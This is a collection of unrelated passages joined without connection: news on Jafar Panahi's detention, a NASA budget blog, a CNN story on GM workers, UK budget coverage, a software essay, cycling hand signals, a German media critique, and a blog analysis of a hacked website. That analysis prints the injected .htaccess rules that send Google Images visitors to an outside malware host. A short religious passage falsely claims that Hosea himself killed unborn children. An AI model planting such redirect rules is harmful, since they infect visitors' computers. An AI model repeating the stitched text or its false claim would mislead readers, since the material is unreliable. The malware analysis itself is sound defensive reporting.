Two days after authorities raided Panahi 's home , they freed 15 of those arrested , including Panahi 's wife , Tahereh Saidi , and his daughter , Solmaz Panahi .
Family friends said that Jafar Panahi and two other filmmakers , Mohammad Rasoulof and Mehdi Pourmusa , are still being held in Evin Prison .
In a press statement hours after the arrests , Jafar Dolatabadi , Tehran 's public prosecutor , declared that Panahi 's arrest has " nothing to do with the fact that he is an artist , nor is it political in nature . "
Dolatabadi went on to say that Panahi had been arrested because he had committed " certain offenses , " though neither Dolatabadi nor the Judiciary has explained the nature of these alleged offenses .
A friend of the family told Human Rights Watch that after more than a week in captivity , Panahi was finally allowed to call his family , but that until he made the call , " he was not aware that the family and his crew were released last week . "
He noted , however , that authorities had informed the family that they would not be allowed to visit Panahi at Evin until the end of the interrogation phase of the investigation .
Another family friend told Human Rights Watch that Rasoulof and Pourmusa had also been allowed to contact their families .
On March 3 , Panahi's son Panah told Kalame.com , a website considered close to opposition leader Mir-Hossein Moussavi , that his father and the others were arrested while working on a film for which they had obtained a government permit .
Panahi's son was not home during the raid and subsequent arrests by security forces .
Following Iran 's disputed June 12 election , Panahi openly expressed his support for the peaceful demands of protesters .
On July 30 , 2009 , during a visit to the Behesht-e Zahra cemetery in southern Tehran , Panahi was briefly detained by security forces along with several other Iranian filmmakers as they were laying flowers on the graves of demonstrators who had lost their lives as a result of state - sanctioned violence following the election .
In February , Iranian authorities prohibited Panahi from leaving Iran to attend the Berlin Film Festival .
They failed to provide Panahi with any reason for their action .
" By targeting high - profile artists such as Jafar Panahi , the Iranian government is sending a clear message that it is willing to go after anyone it considers a threat , " said Whitson .
" If well - known figures like Panahi are not immune from arbitrary arrest and detention , ordinary Iranians will think twice before engaging in any activity that may seem critical of the government . "
Panahi's arrest has drawn sharp criticism at home and abroad , including from several European governments , civil society groups and prominent actors .
On March 8 , a group of well - known Iranian producers , directors and actors visited Panahi 's family to show their support and call for his and his colleagues ' immediate release .
On the same day , authorities confiscated the passport of Simin Behbahani , a well - known poet and cultural critic , preventing her from traveling to Paris for an International Women 's Day event .
Again , authorities failed to provide any reason for their action .
The world bodypaint artists got together under one roof in Seeboden , to celebrate the magic of paints on human body .
In the world 's largest bodypainting festival , artists tranform the body of models under the layers of colours .
This is not just a competition but is also a riot of colours .
Have a look .
As promised , today President Obama released his planned NASA budget for the year .
Not too surprisingly , it 's pretty much as the rumors indicated .
There 's a lot to say here , and I have a lot on my mind , so please hear me out .
The Good News
The good news for sure is an increase of $ 6 billion over the next five years .
It stresses new technology and innovation ( to the tune of over $ 1.5 billion ) , which is also good .
A lot of NASA 's successes have been from pushing the limits on what can be done .
It also stresses Earth science , which is n't surprising at all ; Obama appears to understand the importance of our environmental impact , including global warming .
So that 's still good news .
The very very good news is that half that money -- half , folks , 3.2 billion dollars -- is going to science .
Yeehaw !
The release specifically notes telescopes and missions to the Moon and planets .
That , my friends , sounds fantastic .
Bye bye Constellation Now to the other aspects of this budget .
As I have written before , this new budget axes Constellation :
NASA ’s Constellation program – based largely on existing technologies – was based on a vision of returning astronauts back to the Moon by 2020 .
However , the program was over budget , behind schedule , and lacking in innovation due to a failure to invest in critical new technologies .
Using a broad range of criteria an independent review panel determined that even if fully funded , NASA ’s program to repeat many of the achievements of the Apollo era , 50 years later , was the least attractive approach to space exploration as compared to potential alternatives .
Furthermore , NASA ’s attempts to pursue its moon goals , while inadequate to that task , had drawn funding away from other NASA programs , including robotic space exploration , science , and Earth observations .
The President ’s Budget cancels Constellation and replaces it with a bold new approach that invests in the building blocks of a more capable approach to space exploration ...
[ Emphasis mine . ]
I can't say I disagree with much that 's written there .
A lot of it is based on the conclusions of the Augustine commission , a blue - ribbon panel of experts appointed by Obama to look into NASA 's future plans and make recommendations .
The Space Station
The budget calls for extending the International Space Station beyond the 2016 timeline , perhaps for four more years .
I would say this is a bad idea , BUT the budget also asks for extending the ISS 's scientific capabilities .
I would be happy to see that ; ISS is very limited as a science platform .
However , the dang thing is already built and in orbit , so it makes sense to spend a little bit more ( I was surprised to see only about $ 180 million for this ) to make it useful scientifically .
If that becomes the case , then a lot of the issues I have with ISS go away .
Incidentally , the budget calls for a guaranteed $ 600 million for the next five Shuttle missions to ISS , even if a launch slips into FY11 .
Back to the Moon ?
So , where does this leave us as far as going back to the Moon ?
It leaves us delayed , again .
That sucks .
However , as I have pointed out before , Constellation was already a mess .
Behind schedule , over budget , and starved of funding .
It was a mandate from the Bush White House , but never got the money it needed from them or Congress to ensure it could be done ( this did n't work when it was attempted from the Bush Sr. White House / Congress either ) .
I do n't want a repeat of the Apollo program : a flag - and - footprints mission where we go there , look around , and then come home for another 40 years .
I want to go there and stay there .
Apollo was done as a race , and the goal of a race is to win .
It was n't sustainable .
We need to be able to figure out how to get there and be there , and that takes more than just big rockets .
We need a good plan , and I 'm not really sure what we had up until this point is that plan .
Building a heavy - lift rocket that can take us to the Moon , Mars , and near - Earth asteroids is not really easy .
It 's not like we can dust off the old Saturn V plans and start up the factories again .
All that tech is gone , superseded , and we might as well start from scratch with an eye toward newer tech .
This budget is calling for that , as well as relying heavily on private companies .
Commercial space
And about that .
I 'll say this again : private companies have not yet put a man in orbit , but Space X , as an example , is close to doing so .
Once the Shuttle retires later this year , private companies will be putting humans in space before NASA will have the capability to do so again
[ UPDATE : please see my comment below ; the above statement about companies beating NASA is correct ]
.
I am no fan of paying the Russians or other countries to do this for us , and going the route of civilian space makes sense .
Now , Space X does n't have the heavy lift capacity that an Ares 5 or other planned NASA rocket might have had ... but with routine launches to space covered by private companies , NASA can concentrate on what it should : innovation , pushing the limits , paving the road .
Once the road is laid , let others use it .
So I do n't see this as doom and gloom .
I see this as 1 ) putting science and innovation first , and 2 ) freeing NASA up to do what it does best : explore the boundaries .
Here 's what I think .
Warning : political complaining ahead .
Remember : the way we 've been doing things for 40 years has gotten us literally in circles .
It 's perhaps long past time to shake things up and try something different .
In my previous posts on this ( see Related Posts at the bottom ) , people are complaining that Obama is killing our Moon plans and gutting NASA .
That 's simply not true .
I think this may very well save NASA and our future manned exploration capabilities , if this is all done correctly .
As for that , and having said my piece that I think this is a good idea , it may not matter : the other thing to remember is that this must pass Congress first .
I honestly do n't think that will happen .
For one thing , two many Congresscritters have too big a stake in NASA to let go ; if you do n't believe me , read this article where Alabama Congressmen complain about the new budget .
When Republicans whine about privatizing something , you know you 're in for a fight , and it's not like Congressional Democrats have n't been all that useful in backing up Obama 's plans .
We 'll see how this goes .
If it 's business as usual with Congress , then I suspect it may be a lot like the health care plan all over again : lots of spin and noise , lots of knee - jerk reactions because it 's Obama 's plan , lots of " compromise " that 's really just watering down something to make it worse , and then a budget will be passed that wo n't be able to get anything done .
I 'm pretty damn tired of that , and I 'm going to do something about it .
I 'll write my Congressmen , and I 'll tell them that the time for bending over backwards is long gone .
It 's time to grow a spine , time for boldness , time for innovation .
Whether people like it or not , this is the new budget being proposed , and if Congress wheedles over it , then yeah , NASA really will be screwed , and we 'll spend the next four decades circling our planet and gazing at the Moon , wondering when we 'll ever go back .
Perhaps it 's fitting that this news is released on the anniversary of the loss of Columbia -- it 's been seven years since that day when the orbiter broke up upon re-entry .
A very good case can be made that complacence played a big role in that event .
When it comes to space exploration , we must never rest on our laurels , we must never have the arrogance to think we have it all under control , and we must never forget that to explore means to push ahead into unknown territory .
That is the lesson of Columbia .
The Moon , Mars , and all of space await us .
This new budget may not be perfect , but I strongly suspect it 's the best we can do , and far , far better than the course we currently have laid out .
If we do n't push for this now , we may never go back .
A ship may be safe in the harbor , but that 's not what ships are for .

Later , in Hosea , we learn that because the land of Samaria rejected God , “ Samaria shall become desolate ; for she hath rebelled against her God : they shall fall by the sword : their infants shall be dashed in pieces , and their women with child shall be ripped up ” ( Hosea 13:16 ) .
Hosea decided to carry out God ’s vengeance on the people by killing the unborn babies carried by the heathen women .

By Bob Ruff , CNN
( CNN ) – What would you do if your company closed its doors , but offered you the same job 1000 miles away ?
In December 2008 , in the depths of the recession , GM worker Steve Kerl faced that same question .
Just 8 years from retirement , his GM assembly plant in Janesville , Wisconsin was shut down .
1,933 workers were out of work .
“ What are we going to do ? ” was Kerl ’s first reaction .
“ Are we going to have our health care ?
How are we going to come out ?
We did n’t even know if you were going to have a job . ”
Most of the Janesville plant workers took buyouts .
But 545 of them were fortunate enough to be offered jobs at other GM plants .
The catch ?
The plants are hundreds of miles from Wisconsin .
What would you do ?
Kerl took a job putting fenders on GM SUV ’s in Arlington , Texas .
It ’s hard work .
At the end of his 10 - hour shifts he goes back to bunk with two other GM workers in a three - bedroom apartment near the plant .
Home is 1000 miles away .
Kerl ’s wife and two teenage kids remain behind in Janesville .
The Kerls did n’t want to take the kids out of school .
And they could n’t face the prospect of selling their house anyway with real estate prices plummeting .
The Kerl family , along with many others who worked at GM in Janesville , is yet another side of the recession .
Families physically separated by economic circumstances beyond their control .
The sacrifice is palpable .
“ In the last couple of months , “ he told us , “ I missed all of my daughter ’s gymnastics meets .
I missed her birthday … I missed my boy ’s birthday .
So [ these ] are things you ’re never going to get back .
You know , that ’s gone . ”
The sacrifice is spread evenly throughout the family .
“ Steve will talk to me on the phone , ” his wife , Kristy , told us , “ and , you know , get me through it .
Hang in there .
And then there ’s the days that calls come in that he ’s like , you know what , I ’m not doing this anymore .
You know , I want to come home .
And I ’m like , no !
Hang in there ! ”
Jenessa , their teenage daughter , says it ’s “ really hard … I mean , what other 16 - year - old does n’t want their Dad around ?
He ’s always been the one that ’s at the meets , and always there for support . “
Jeramie Kerl , 19 , is their son : “ When Dad left I kind of had to assume most of the responsibilities that he did , the outside work … mowing the grass , which he took care of . ”
In the midst of all of this , the Kerls have literally opened their Janesville home to the 16 - year - old daughter of another former Janesville plant worker and his wife , both of whom have moved to work at an Indiana GM plant .
Steve introduced us to Grace , who is Jenessa ’s friend .
Everyone wanted Grace to be able to finish her sophomore year before moving to Indiana .
“ We like to have her here , ” says Steve .
As we finished the interview with the Kerls , Steve told us the separation has been too much .
They ’re moving to Texas .
The house just sold , at a loss , and they hope to be together near Arlington before the end of the summer .
As we watched Steve pack for the long trip back to Texas , we saw him trying to figure out a way to squeeze a hunk of Wisconsin cheese into his packed suitcase .
“ This will always be our home , ” he said .
“ You ’ll never take Wisconsin out of us , ” added Kristy .
“ We ’ll return some day . ”

In - vitro fertilizations will soon be covered under the province 's medicare system , Quebec Health Minister Yves Bolduc announced Thursday .
The decision is the first of its kind in North America , and will come into effect by the end of spring .
" Even on the international scale , few societies are as advanced as ours in covering ( IVF ) services in the public sector , " said Bolduc .
Medicare will cover three attempts at fertilization , as well as all related procedures .
" We 'll have between 7,000 and 10,000 women per year who will use this service , " said Bolduc .
The government currently offers a 50 - per-cent tax credit on the IVF .
Each treatment costs between $ 5,000 and $ 10,000 .
The government is expected to dole out $ 32 million for the new program in 2010 , but costs will rise to $ 80 million within four to five years .
The Liberal government had promised during its 2008 election campaign that it would introduce full medical coverage of in - vitro fertilization .
Improved services
The government also plans to hand out $ 2 million to renovate the MUHC 's fertility centre at the Royal Victoria Hospital .
The improvements include renovations to the centre , the addition of new local clinics and enhanced specialized equipment .

What is software ?
What is it about software that takes so long to create ?
And why does software development so often go wrong , compared to other kinds of engineering ?
Along with my day job as a software consultant , I like to think about the essence of this stuff I work with every day .
I wonder why it is different from other " stuff " that humans build things with , such as bricks and steel and chemicals .
Computer scientists have proposed many ways of looking at software , including as a function with inputs and an output , and as instructions for transforming computer memory from one state to another .
I like to think of software , however , as a machine .
It is a machine we cannot touch , but it is a machine nonetheless .
( I am not the first to suggest this view . )
Equivalently , we can think of software as one part of a machine that includes the computer hardware , allowing us to see software as a component of a physical machine .
When we create a new software system we are creating a new machine .
The principles that apply to good machine design also apply to good software design , such as durability , maintainability , and simplicity .
But , if this is true , why does software development seem harder than mechanical or structural engineering ?
After all , people build airplanes , bridges , skyscrapers and factories , on time and on budget .
( Not always of course , but often . )
It is rare that large physical engineering projects are simply abandoned half - built , after years of effort , with millions of dollars spent , left to rust under the elements .
But there are many examples of this scale of failure for software projects , including the Denver Airport , FBI 's computer upgrade , and the IRS 's modernization effort .
Many , many others were never made public because their failures were hidden by organizations not wishing to be embarrassed by the scope of their incompetence .
So what , specifically , is it about software that causes large software projects to go wrong more often than with other kinds of engineering ?
This question has been examined before , including in Dreaming in Code , Patterns in Failure , and Why Software Is So Bad .
Some of the proposed answers are poor requirements documentation , and that software is just plain harder than other kinds of engineering .
I believe there is another answer , however , which has not been stated clearly .
The problem is not the nature of software ; software is just a type of machine and is amenable to known methods for good machine design and project management .
The problem is the way we approach software projects and our expectations for their outcomes .
In short , we expect too much .
Too often we try to " invent the world " with a new software project , instead of relying on well - known designs and methods that are likely to succeed .
Consider this fictional mechanical engineering project that is run like many software projects .
The motivation for this project is that cars are a very poor form of transportation for individual people .
This has been widely recognized for a long time .
We want a smaller , lighter , cleaner , less expensive device for personal , local transportation .
We will call the new invention " Personal Transportation Device 1000 " , stating its intended selling price in US Dollars .
For individual commuting and errands within 50 miles , we want PTD - 1000 to make the current automobile obsolete .
We do not want the device to use existing , already congested , roads so PTD - 1000 will fly .
Our goals include low fuel cost and no pollution , so the motor will be powered by helium fusion .
Fusion is an emerging standard , but we believe that this project will provide synergy to fusion research , both driving the research and serving as a test bed for it .
We want the device to be light , which will contribute to efficiency and allow the single user to pick it up , so we will construct PTD - 1000 primarily from Rearden Metal .
The design team recognizes that the formulation for this metal is not yet finished , so we will assign our A - team of engineers to finish this work in parallel with the other subsystems .
The final key design criterion is that a person who is physically disabled must be able to enter a building after getting there .
So PTD - 1000 will convert to a wheelchair for use indoors .
The participants in this project all understand that it is a substantial undertaking , but enthusiasm is high for the benefits that will be realized at its completion .
There is buy - in by all stakeholders .
The investors and engineers have committed to a budget and a completion date of Q4 2011 .
Everyone has agreed to forgo their vacations for the next year in order to meet this schedule .
Of course , this fictional invention is absurd .
Anyone with common sense can see that it will fail dramatically .
But take the above scenario , and substitute software concepts for the physical details , and you have an accurate description of many real software projects .
Labour likely go to the country on same day as local elections in England as budget date confirmed
This article is more than 10 years old

The Treasury will announce the budget will be held on 24 March , making 6 May a racing certainty for the general election .
The timing is likely to mean parliament debating the budget in the week of 29 March .
Gordon Brown could then go to Buckingham Palace to call the election on 6 April , after the Easter holiday weekend .
MPs and peers would spend a short time in parliament to negotiate remaining bills .
A 6 May election , on the same day as local elections in England , has for some time been regarded as the favoured date .
But it runs the risk for Labour of seeing critical first - quarter growth figures published in the final fortnight of the campaign .
Ministers are increasingly optimistic , however , that the figures will not reveal a slide back into recession .
It is not expected that the chancellor , Alistair Darling , will have to reveal major changes to growth forecasts or the size of the public sector deficit .
He may have some cash spare from lower - than - expected unemployment forecasts .
In a speech in London Brown is expected to confirm a cap on public sector pay rises despite civil servants gearing up for strikes in the run-up to the election .
Brown is expected to use a speech on the economy to reaffirm the government 's position as set out in last year 's pre-budget report .
He will tell public sector workers that from 2011 those at the higher end will see an absolute pay cap and that 700,000 middle - ranking civil servants , including police officers , nurses and teachers , will have pay rises capped at 1 % for two years .
That could amount to a real - terms cut .
The plans for senior public sector workers would affect 40,000 GPs , hospital consultants , Whitehall 's highest paid civil servants and the chief executives of quangos .
When he announced the plans , the chancellor said the move would save the exchequer £ 3.4bn a year .
Darling has written to the salary review bodies calling for a freeze on the pay of the highest - paid civil servants and a cap of 1 % for those in the middle .
The full details will be published tomorrow , including exemptions for armed forces .
Some 200,000 civil servants ranging from 999 operators and coastguards to court workers began a 48 - hour strike on Monday .
Driving tests have been cancelled and police officers called on to man 999 emergency lines in London .
Yesterday the Policy Exchange thinktank published research showing that public sector productivity fell nearly 4 % in the decade after 1997 , while growing by 23 % in the private sector .
Neil O'Brien , director of Policy Exchange , said : " Despite this , pay has risen by 15 % more than in the private sector .
The simple truth is that we need public services run on 21st century principles – not the rules of the 70s . "
One of the main selling points of health care reform was that it would cut the federal deficit by a supposed $ 143 billion over the next decade and a trillion - plus dollars in the one after that .
But not only will the legislation not cut one thin dime from the deficit , it will also certainly cost far more than the $ 940 billion in new spending already on the table for at least three reasons .
These include :
1. Legislative Trickery .
Congressional Democrats have pledged support for " the doc fix , " a permanent upward adjustment to the rates at which Medicare providers are reimbursed .
As Speaker Nancy Pelosi has said , " We have made a commitment to do this .
This is very important . "
The cost of the " doc fix " ?
Some $ 247 billion over the next 10 years , wiping out any deficit reduction from health care reform .
2. Higher Premiums .
In 2006 , Massachusetts passed health care reform very similar to what President Obama just signed .
The result ?
The Bay State now has the highest premiums in the country and cost about 33 percent more than expected .
3. Bad Accounting .
The government is terrible at predicting how much programs will cost , especially when it comes to medical care .
Initial 1960s ' projections of Medicare 's costs in 1990 had the program costing about $ 12 billion ; the actual result was almost 10 times that amount .
As a Joint Economic Committee report notes , " Major health care proposals have almost always cost more … than the highest cost estimates published while the legislation was pending . "
Approximately 2.19 minutes .

Are there a good set of distinct hand signals for communication to automobiles and other riders in a group riding situation ?
I have found that the following set of distinct hand signals work the best with for clear communications .
BICYCLING HAND SIGNALS
The following is set of uniform hand signals for bicyclists .
The first set of hand signals are for general traffic patterns regardless of whether other bicyclists are present or not .
The second set of hand signals are for group riding or pace lines .
LEFT TURN
RIGHT TURN ( best signal )
OR
RIGHT TURN ( not as good as the above signal )
SLOWING OR STOPPING USING THE LEFT HAND .
Palm of your hand held facing back toward traffic ,
other riders behind you , and out from the side of your body .
SLOWING OR STOPPING USING THE RIGHT HAND .
Palm of your hand held facing back toward traffic ,
other riders behind you , and out from the side of your body .
RAIL ROAD CROSSING
Use your right arm to warn others that a railroad crossing is ahead .
Swing your forearm away from and toward your body like a swing arm ( or like broken arm ) .
Palm of your hand held facing back toward traffic and other riders behind you .
RAIL ROAD CROSSING
Use your left arm to warn others that a railroad crossing is ahead .
Swing your forearm away from and toward your body like a swing arm ( or like broken arm ) .
Palm of your hand held facing back toward traffic and other riders behind you .
HAND SIGNALS FOR GROUP RIDING AND PACE LINES
LEAVING THE FRONT OF THE PACE LINE
AND MOVING TO THE RIGHT
Hold your upper arm at shoulder level with your forearm bent , so that your hand is against the side of your body .
This forms an arrow pointing to the right .
Hold this signal for two to three seconds to give the rider directly behind you time to prepare to take the lead of the pace line .
LEAVING THE FRONT OF THE PACE LINE
AND MOVING TO THE LEFT
Hold your upper arm at shoulder level with your forearm bent , so that your hand is against the side of your body .
This forms an arrow pointing to the left .
Hold this signal for two to three seconds to give the rider directly behind you time to prepare to take the lead of the pace line .
POTHOLES OR DEBRIS ON THE LEFT SIDE
Left hand held out and moved around in a circular pattern with the palm of your hand held down toward the street .
The left hand can be held out and moved in a front to back swinging motion to signal a long stretch of problems parallel to the direction of travel .
POTHOLES OR DEBRIS ON THE RIGHT SIDE
Right hand held out and moved around in a circular pattern with the palm of your hand held down toward the street .
The right hand can be held out and moved in a front to back swinging motion to signal a long stretch of problems parallel to the direction of travel .
LEFT ARM AND HAND HELD UP AND OUT TO SIGNAL THAT BICYCLISTS , RUNNERS , SKATERS OR VEHICLES ARE ON THE LEFT
They are approaching , parked or traveling in the same direction at a slower speed .
The palm of your hand is held facing forward .
RIGHT ARM AND HAND HELD UP AND OUT TO SIGNAL THAT
BICYCLISTS , RUNNERS , SKATERS OR VEHICLES ARE ON THE RIGHT
They are either traveling in the same direction at a slower speed , parked or approaching .
The palm of your hand is held facing forward .
When ever you pass slower riders , runners or skaters , etc. , sound out that you are " PASSING ON YOUR LEFT " IN A LOUD VOICE .
In some rare cases , you will pass them on their right .
Sound out in a loud voice that you are " PASSING ON YOUR RIGHT . "

A friend of mine recently e-mailed a discussion list with an interesting query .
Stonewall Ballard had searched on " tradingbloxlogo " on Google Images , which led to the results on this page .
Clicking on the first result , an image from the tradingblox.com site , took him to this page , with the Google information header at the top , and loading the http://www.tradingblox.com/tradingblox/courses.htm page in a frame in the bottom half of the browser window .
When that page was loaded in that bottom frame , Internet Explorer and Firefox would both flash warnings about the page being infected with malware .
But if you loaded the http://www.tradingblox.com/tradingblox/courses.htm page in a normal
Web browser window by itself , the browser would not display any warning , and checking the site using Google 's malware query form returned a result saying the site was not suspicious .
Why the differing results ?
It turned out that the tradingblox.com had been hacked , and pages had been installed onto the server that would serve malware in an unusual way :
If the page was being viewed in a frame loaded from Google Images , or as as result of a click through from Google Images , then the page would serve content that attempted to infect the user 's computer with malware .
On the other hand , if the page was viewed normally ( as a result of typing the page into your browser ) , the malware - loading code would not be served .
That means if you were to telnet to port 80 on the www.tradingblox.com server , and request a page as follows :
GET / tradingblox/courses.htm HTTP/1.1
Host : www.tradingblox.com
then the normal page would be returned .
But if you entered these commands :
GET / tradingblox/courses.htm HTTP/1.1
Host : www.tradingblox.com
Referer : http://images.google.com/
then you would get the malware - infected page .
( The webmaster has since fixed the problem , so that the latter request will no longer get the malware code . )
The webserver would only serve the infected content if " images.google.com " was sent specifically as the referrer ; " www.google.com " by itself would not trigger the result .
( For the uninitiated , when you click a link from one page to another , for example if you were reading an article on CNN.com which had a link to http://www.google.com/support/ and you clicked on that link , then when your browser requested the file " / support / " from the www.google.com server , it would send the request as follows :
GET / support / HTTP/1.1
Host : www.google.com
Referer : http://www.cnn.com/article.url.goes.here/
So the webmasters of www.google.com can see what links people are clicking from other websites to reach the www.google.com site .
Many sites use this to track which links from other pages , including advertisements that they 've bought on other sites , are sending them the most traffic . )
Denis Sinegubko , owner of the website malware - infection checking site UnmaskParasites.com , says that he had seen pages before which would serve infected content if www.google.com itself were listed in the Referer : field .
However , this was the first instance he'd seen where the content was only served if images .
google.com was specifically listed as the Referer .
Since no malware distributor would manually break into just one website to compromise it in this exact manner , it 's extremely likely that there are many more sites that are infected in the same way .
Stonewall Ballard noted that the Google Safe Browsing lookup for the hosting company where tradingblox.com is hosted , showed a high number of other sites on the same network that had been infected recently .
( And those are only the infected sites that Google knows about -- recall that Google did n't even know that tradingblox.com was infected . )
Obviously , from the malware author 's point of view , the point of serving malware content only some of the time rather than all of the time , is to make it harder for webmasters to pinpoint the problem .
Someone gets the malware warning after following a link or loading a page via Google Images , and sends the webmaster an e-mail saying , " I got infected by your webpage , here is the link . "
The webmaster views the link and says , " I do n't know what you 're talking about , there 's no malware code on that page . "
It also makes it harder for automated site - checking tools to detect the infection .
Google 's Safe Browsing lookup tool reported the site as uninfected , and Sinegubko 's site - checking tool on UnmaskParasites.com also reported no malware infections on tradingblox.com , even while the site was still infected .
( Sinegubko said he would possibly modify his site - checking script so that in addition to the other checks it performs , it will attempt to request a page sending " http://images.google.com/ " in the " Referer : " field , to see if that results in different content being served .
Google 's Safe Browsing spider should do the same . )
Sinegubko said he's also seen instances where hacked sites would cover their tracks even further , by refusing to display infected content if the Referer : link from Google contained " inurl:domainname.com " or " site:domainname.com " .
This is because webmasters would sometimes check if their site was serving infected content in response to a click from Google , by doing a Google search on their own domainname.com , and following the link back to their site .
By not serving the infected content in that case , the malware infection becomes even harder to detect .
This also makes it harder to report the exploits to the hosting companies that host infected websites .
In case the webmaster of the infected site does n't respond to complaints that their site is infected , sometimes you have to contact the hosting company and ask them to forcibly take the website offline until the problem is fixed .
And I have been hosted by several companies where the tech support and abuse departments were ( just barely ) competent enough that if I called them up and said , " Your customer is hosting a malware - infected webpage , go to this page and view the source code , and you can see the malicious code " , they would have known what to do .
But if I 'd had to tell them to follow the steps above -- " telnet to port 80 " on the infected website , and type a few lines to mimic the process of a browser sending HTTP request headers to the website -- I probably would have lost them at " telnet " .
( Recall an experiment wherein I e-mailed some hosting companies from a Hotmail account , asking them to change the nameservers for a domain that I had hosted with them , and about half of the hosting companies agreed to switch the domain nameservers -- essentially , transferring the entire website to an unknown third party -- without ever authenticating that it was really me writing from that Hotmail account .
Which means anybody could have taken over those websites simply by sending an e-mail .
Front - end tech support at cheap hosting companies is often not very smart . )
Fortunately , Tim Arnold , the webmaster of the tradingblox.com site , did respond to the original report about the malware - infected pages , and found that an intruder had hacked the site on November 30th and inserted these lines into an .htaccess file :
RewriteEngine On
RewriteOptions inherit
RewriteCond %{HTTP_REFERER} .*images.google .*$ [ NC , OR ]
RewriteCond %{HTTP_REFERER} .*images.search.yahoo . *$ [ NC ]
RewriteRule .* http://search-box.in/in.cgi?4¶meter=u [ R,L ]
< Files 403.shtml >
order allow , deny
allow from all
</ Files >
which resulted in the infected pages being served whenever a user loaded the site via Google Images .
( So if you found this article because you think your own site might be infected by malware that serves pages conditionally on the Referer : field , that 's the first place to look to fix the problem ! )
It 's uncertain how Arnold 's site got infected in the first place , but Sinegubko had earlier said that almost 90 % of breakins in 2009 that occurred on Linux - hosted sites , were caused by malware installed surreptitiously on people 's Windows PCs and stealing the passwords that people used to administer their sites .
Or the site could have been compromised via a WordPress exploit such as this one .
As I always tell anyone who will listen , if you want to keep your Linux - hosted website from being broken into , one of the most frequently overlooked precautions that you need to take is to keep your Windows PC free of spyware .
But the larger point is that as malware becomes more aggressive , it 's not just going to become harder to keep your PC and websites uninfected .
It 's also going to become harder for site owners and for hosting company abuse departments to verify that a site has been hacked , as the hacks use more sophisticated techniques to prevent the infection from being discovered .
Abuse report handlers will have to be trained to understand what it means that a website is only showing infected content as a result of a " Referer : " header , and ideally should know enough about networking and command - line tools , to be able to mimic the " telnet " instructions above .
( Most expensive dedicated hosting companies like RackSpace , do have technical staff who are at least that knowledgeable .
But cheap shared hosting companies -- the kind where you can get your domain transferred to another company by sending an e-mail from an unauthenticated Hotmail account -- will have to train their abuse staff better . )
Automated site - checking tools like Google 's Safe Browsing spider and UnmaskParasites.com 's site checker will have to start taking these attacks into account when checking a site for infection .
And as always , keeping your PC free of spyware , should n't be viewed just as a convenience to yourself , but as an obligation to your neighbors as well .
( A case of the positive / negative externalities problem in economics . )
You would n't send your kid to school with the flu , so why did you get your Mom on the Internet without buying her some anti-virus software ?
Mark Pittelkau , einer der Chefreporter der “ Bild ” - Zeitung und sowas wie ihr Grand - Prix - Beauftragter , ist bei dem von Stefan Raab organisierten deutschen Vorentscheid eine unerwünschte Person .
Wenn das Blatt bei den Pressekonferenzen von “ Unser Star für Oslo ” dabei sein will , muss es einen anderen Vertreter schicken .
Das ist nicht gerade förderlich für eine faire oder gar freundliche Berichterstattung in “ Bild ” , aber die erwarten die Leute um Raab von der Zeitung im Allgemeinen und Pittelkau im Besonderen ohnehin schon lange nicht mehr .
Eine einschneidende Erfahrung liegt zehn Jahre zurück : Damals vertrat Stefan Raab Deutschland beim Song Contest in Stockholm .
Einen
Tag vor dem Wettbewerb veröffentlichte “ Bild ” einen Artikel , der laut Raab frei erfunden war .
Pittelkau hatte unter anderem behauptet , dass zwei 16 - Jährige Mädchen Raab in Stockholm mit den Worten “ Hadder denn da wat , un wenn ja , was hadder da ” in den Schritt gegriffen hätten und der Moderator zum Frühstück Gummibärchen esse – wegen der Potenz .
Vier Jahre später war Raab wieder beim Grand - Prix , diesmal als Komponist und Mentor von Max Mutzke .
Er hatte — im Gegensatz zu RTL , das seine Kandidaten mit Haut und Haaren der “ Bild ” - Zeitung ausliefert — erkannt , dass er für den Erfolg nicht auf das Wohlwollen und große Schlagzeilen von “ Bild ” angewiesen ist .
Die “ Bild ” - Zeitung versuchte die Veranstaltung zunächst weitgehend totzuschweigen .
Doch dann kam Pittelkaus Kollege Christian Schommers mit einer Enthüllung :
Ein türkischer Hotelier , bei dem er seine Rechnung trotz Mahnungen nicht bezahlt habe , erhebe “ schwere Vorwürfe ” gegen Mutzke .
Die Geschichte hielt keiner Überprüfung stand : Das vermeintliche Opfer selbst widersprach .
Um eine Gegendarstellung zu vermeiden , bot “ Bild ” nach Angaben von Raabs Management 5000 Euro und freundliche Berichterstattung .
Mutzke lehnte ab .
Ein Gericht zwang “ Bild ” dazu , eine lange Gegendarstellung zu veröffentlichen .
Wer “ Bild ” kennt , weiß , dass ihre Berichterstattung eher von solchen Vorgeschichten und einer Sortierung nach Freunden ( Dieter Bohlen ) und Feinden ( Stefan Raab ) bestimmt wird , als von irgendwelchen journalistischen Kriterien .
Insofern ist es auch konsequent , dass das Blatt über die Sendung “ Unser Star für Oslo ” seit ihrem Start vor sechs Wochen zumindest bundesweit nicht berichtet hat .
Bis gestern :
Mark Pittelkau konnte exklusiv enthüllen , dass ein völlig unbekannter Mann , der sich als einer von Tausenden beim Casting für die Show beworben hatte und dessen misslungenes Vorsingen in einem kurzen Clip bei “ TV Total ” zu sehen war , im Urlaub in Thailand gestorben ist — für “ Bild ” die Nachricht des Tages .
Online zeigte Bild.de ein Dutzend Fotos des unbekannten jungen Mannes , Urlaubsbilder und Aufnahmen von früheren Auftritten auf irgendwelchen Bühnen , erzählte detailverliebt und tränenreich , dass er auf der Rückreise von einem Urlaub in Australien war , wo er sechs Wochen lang war und einen Freund besucht hatte , der Karim heißt und “ vor Jahren Europa den Rücken gekehrt hatte ” — zufälligerweise exakt jenes Europa , in dem es einen Schlagerwettbewerb gibt , an dem sein Freund Bobby Donner gerne teilgenommen hätte !
Heute verriet Pittelkau in einem weiteren großen Artikel neue Details über das Drama dieses völlig unbekannten jungen Mannes : Todesursache sei eine verschleppte Herzmuskelentzündung gewesen , die Leiche soll nächste Woche nach Deutschland überführt werden , die Mutter hat schon ein Grab ausgesucht .
Daneben auch diesmal wieder ein Foto von Stefan Raab , der Bobby Donner vermutlich nie getroffen hat .
“ Bild ” hat den Toten posthum sogar zum “ Grand - Prix - Kandidaten ” befördert .
Fast könnte man Mitleid haben mit Mark Pittelkau .
Womöglich hat er wochenlang nach Schmutz gewühlt , mit dem er Raab und sein verdammtes Casting bewerfen kann , irgendeine schlimme Geschichte , um den Mann schlecht aussehen zu lassen , wie damals bei Max Mutzke .
Und alles , was er gefunden hat , ist , dass einer der viereinhalb Tausenden Bewerber Monate nach dem Vorsingen unter tragischen Umständen im Ausland gestorben ist ?
